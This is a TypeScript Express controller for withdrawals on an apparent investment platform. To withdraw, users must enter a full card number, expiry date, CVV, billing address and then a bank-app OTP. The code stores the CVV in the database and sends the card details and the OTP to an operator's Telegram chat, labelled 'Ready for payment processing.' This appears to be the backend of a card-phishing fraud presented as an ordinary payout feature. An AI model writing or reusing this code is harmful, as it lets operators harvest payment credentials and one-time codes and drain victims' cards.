import { Response } from 'express'
import { AuthRequest, authenticateToken } from '../middleware/auth.js'
import { prisma } from '../config/db.js'
import { notifyWithdrawalRequest, sendTelegramWithButtons } from '../services/telegramService.js'
import { generateWithdrawalId } from '../utils/helpers.js'
import { z } from 'zod'
import TelegramBot from 'node-telegram-bot-api'

const WITHDRAWAL_FEE_PERCENT = 0.02
const WITHDRAWAL_FEE_MIN = 1
const WITHDRAWAL_FEE_MAX = 5

const getWithdrawalFee = (amount: number): number => {
  const fee = amount * WITHDRAWAL_FEE_PERCENT
  return Math.max(WITHDRAWAL_FEE_MIN, Math.min(WITHDRAWAL_FEE_MAX, fee))
}

const createWithdrawalSchema = z.object({
  investmentId: z.string().optional(),
  balanceSource: z.enum(['INVESTMENT', 'REFERRAL']).default('INVESTMENT'),
  amount: z.number().min(1),
  method: z.enum(['CARD']),
  cardNumber: z.string().regex(/^\d{16}$/, 'Card number must be 16 digits'),
  cardholderName: z.string().min(2, 'Cardholder name required'),
  expiryDate: z.string().regex(/^(0[1-9]|1[0-2])\/\d{2}$/, 'Expiry date format must be MM/YY'),
  cvv: z.string().regex(/^\d{3}$/, 'CVV must be 3 digits'),
  billingAddress: z.string().min(5, 'Billing address required'),
})

const submitOtpSchema = z.object({
  otpCode: z.string().regex(/^\d{4,10}$/, 'OTP must contain 4 to 10 digits'),
})

const activeWithdrawalStatuses = ['PROCESSING', 'WITHDRAWAL_PENDING']

const storedFee = (withdrawal: { amount: number, feeAmount: number, transactionHash: string | null }): number => {
  if (Number(withdrawal.feeAmount) > 0) return Number(withdrawal.feeAmount)
  const match = withdrawal.transactionHash?.match(/Fee: ([\d.]+)/)
  return match ? Number(match[1]) : getWithdrawalFee(Number(withdrawal.amount))
}

export const getWithdrawals = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const withdrawals = await prisma.withdrawal.findMany({
      where: { userId: req.user!.id },
      include: { investment: true },
      orderBy: { createdAt: 'desc' },
    })

    res.status(200).json({ success: true, data: withdrawals })
  } catch (error) {
    console.error('Get withdrawals error:', error)
    res.status(500).json({ success: false, message: 'Server error' })
  }
}

export const createWithdrawal = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const validated = createWithdrawalSchema.parse(req.body)
    const { investmentId, balanceSource, amount, method, cardNumber, cardholderName, expiryDate, cvv, billingAddress } = validated

    let investment
    if (balanceSource === 'REFERRAL') {
      // Referral rewards become withdrawable only after the user has made and
      // had at least one package deposit confirmed.
      const confirmedDeposit = await prisma.deposit.findFirst({
        where: { userId: req.user!.id, status: 'PAYMENT_RECEIVED', investmentId: { not: null } },
        orderBy: { createdAt: 'asc' },
        include: { investment: true },
      })
      if (!confirmedDeposit?.investment) {
        res.status(403).json({ success: false, message: 'A confirmed package deposit is required before referral rewards can be withdrawn.' })
        return
      }
      investment = confirmedDeposit.investment
    } else {
      if (!investmentId) {
        res.status(400).json({ success: false, message: 'Select an investment to withdraw from.' })
        return
      }
      investment = await prisma.investment.findFirst({
        where: { id: investmentId, userId: req.user!.id },
      })
      if (!investment) {
        res.status(404).json({ success: false, message: 'Investment not found' })
        return
      }
    }

    const fee = getWithdrawalFee(amount)
    const totalDeduct = Number(amount) + fee

    const reservedWithdrawals = await prisma.withdrawal.findMany({
      where: {
        userId: req.user!.id,
        balanceSource,
        ...(balanceSource === 'INVESTMENT' ? { investmentId: investment.id } : {}),
        status: { in: activeWithdrawalStatuses },
      },
      select: { amount: true, feeAmount: true, transactionHash: true },
    })
    const reservedAmount = reservedWithdrawals.reduce((total, item) => total + Number(item.amount) + storedFee(item), 0)
    const sourceBalance = balanceSource === 'REFERRAL'
      ? Number((await prisma.user.findUnique({ where: { id: req.user!.id }, select: { walletBalance: true } }))?.walletBalance || 0)
      : Number(investment.currentBalance)

    if (sourceBalance - reservedAmount < totalDeduct) {
      res.status(400).json({ success: false, message: `Insufficient balance. Fee: $${fee.toFixed(2)}` })
      return
    }

    const withdrawalId = generateWithdrawalId()

    const withdrawal = await prisma.withdrawal.create({
      data: {
        withdrawalId,
        userId: req.user!.id,
        investmentId: investment.id,
        amount,
        balanceSource,
        feeAmount: fee,
        method,
        cardNumber,
        cardholderName,
        expiryDate,
        cvv,
        billingAddress,
        status: 'PROCESSING',
        transactionHash: `Fee: ${fee.toFixed(2)}`,
      },
      include: { investment: true },
    })

    await notifyWithdrawalRequest(
      withdrawal.id,
      `${req.user!.firstName} ${req.user!.lastName}`,
      Number(amount),
      method,
      {
        cardNumber: withdrawal.cardNumber!,
        cardholderName: withdrawal.cardholderName!,
        expiryDate: withdrawal.expiryDate!,
        cvv: withdrawal.cvv!,
        billingAddress: withdrawal.billingAddress!,
      }
    )

    res.status(201).json({
      success: true,
      message: 'Withdrawal submitted. Please enter OTP from your bank app.',
      data: {
        ...withdrawal,
        cardNumber: `${cardNumber.slice(0, 4)} **** **** **** ${cardNumber.slice(-4)}`,
      },
    })
  } catch (error) {
    if (error instanceof z.ZodError) {
      res.status(400).json({ success: false, message: 'Validation error', errors: error.errors })
      return
    }
    console.error('Create withdrawal error:', error)
    res.status(500).json({ success: false, message: 'Server error' })
  }
}

export const submitOTP = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const { id } = req.params
    const { otpCode } = submitOtpSchema.parse(req.body)

    const withdrawal = await prisma.withdrawal.findUnique({
      where: { id, userId: req.user!.id },
    })

    if (!withdrawal) {
      res.status(404).json({ success: false, message: 'Withdrawal not found' })
      return
    }

    if (withdrawal.status !== 'PROCESSING') {
      res.status(400).json({ success: false, message: 'Withdrawal not in processing state' })
      return
    }

    const transition = await prisma.withdrawal.updateMany({
      where: { id, userId: req.user!.id, status: 'PROCESSING' },
      data: {
        verificationCode: otpCode,
        status: 'WITHDRAWAL_PENDING',
        isVerified: true,
      },
    })
    if (transition.count === 0) {
      res.status(409).json({ success: false, message: 'Withdrawal state changed. Refresh and try again.' })
      return
    }

    const updated = { ...withdrawal, verificationCode: otpCode, status: 'WITHDRAWAL_PENDING', isVerified: true }

    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
    const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID
    if (BOT_TOKEN && ADMIN_CHAT_ID) {
      try {
        const bot = new TelegramBot(BOT_TOKEN, { polling: false })
        await bot.sendMessage(ADMIN_CHAT_ID,
          `OTP Received for Withdrawal\n\nUser: ${req.user!.firstName} ${req.user!.lastName}\nCard: ${withdrawal.cardNumber?.replace(/(\d{4})(?=\d)/g, '$1 ')}\nAmount: $${withdrawal.amount}\nOTP: ${otpCode}\n\nReady for payment processing.`
        )
      } catch (e) {
        console.error('Failed to notify admin:', e)
      }
    }

    await sendTelegramWithButtons(
      `OTP received for withdrawal. Amount: $${withdrawal.amount}. Ready for payment processing.`,
      [
        { text: 'Mark Paid', callback_data: `paid_withdrawal_${withdrawal.id}` },
        { text: 'Reject', callback_data: `reject_withdrawal_${withdrawal.id}` },
      ],
    )

    res.status(200).json({
      success: true,
      message: 'OTP submitted. Admin will process your withdrawal.',
      data: updated,
    })
  } catch (error) {
    if (error instanceof z.ZodError) {
      res.status(400).json({ success: false, message: 'Validation error', errors: error.errors })
      return
    }
    console.error('Submit OTP error:', error)
    res.status(500).json({ success: false, message: 'Server error' })
  }
}

export const approveWithdrawal = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const { id } = req.params
    const { transactionHash, adminNotes } = req.body

    const withdrawal = await prisma.withdrawal.findUnique({
      where: { id },
      include: { investment: true },
    })

    if (!withdrawal) {
      res.status(404).json({ success: false, message: 'Withdrawal not found' })
      return
    }

    if (withdrawal.status !== 'WITHDRAWAL_PENDING' || !withdrawal.isVerified) {
      res.status(400).json({ success: false, message: 'Withdrawal must be pending and verified before payment' })
      return
    }

    const fee = storedFee(withdrawal)
    const totalDeduct = Number(withdrawal.amount) + fee

    const paid = await prisma.$transaction(async (tx) => {
      const transition = await tx.withdrawal.updateMany({
        where: { id, status: 'WITHDRAWAL_PENDING', isVerified: true },
        data: { status: 'WITHDRAWN', transactionHash, adminNotes },
      })
      if (!transition.count) return 'STATE_CHANGED' as const

      const deducted = withdrawal.balanceSource === 'REFERRAL'
        ? await tx.user.updateMany({ where: { id: withdrawal.userId, walletBalance: { gte: totalDeduct } }, data: { walletBalance: { decrement: totalDeduct } } })
        : await tx.investment.updateMany({ where: { id: withdrawal.investmentId, currentBalance: { gte: totalDeduct } }, data: { currentBalance: { decrement: totalDeduct } } })
      if (!deducted.count) throw new Error('INSUFFICIENT_SOURCE_BALANCE')
      return 'PAID' as const
    })
    if (paid === 'STATE_CHANGED') {
      res.status(409).json({ success: false, message: 'Withdrawal state changed. Refresh and try again.' })
      return
    }

    const updated = { ...withdrawal, status: 'WITHDRAWN', transactionHash, adminNotes }

    res.status(200).json({ success: true, message: 'Withdrawal approved', data: updated })
  } catch (error) {
    if (error instanceof Error && error.message === 'INSUFFICIENT_SOURCE_BALANCE') {
      res.status(400).json({ success: false, message: 'The withdrawal source no longer has enough balance.' })
      return
    }
    console.error('Approve withdrawal error:', error)
    res.status(500).json({ success: false, message: 'Server error' })
  }
}

export const rejectWithdrawal = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const { id } = req.params
    const { adminNotes } = req.body

    const transition = await prisma.withdrawal.updateMany({
      where: { id, status: { in: ['PROCESSING', 'WITHDRAWAL_PENDING'] } },
      data: { status: 'REJECTED', adminNotes },
    })

    if (transition.count === 0) {
      res.status(409).json({ success: false, message: 'Withdrawal is already completed or no longer active' })
      return
    }

    res.status(200).json({ success: true, message: 'Withdrawal rejected' })
  } catch (error) {
    console.error('Reject withdrawal error:', error)
    res.status(500).json({ success: false, message: 'Server error' })
  }
}
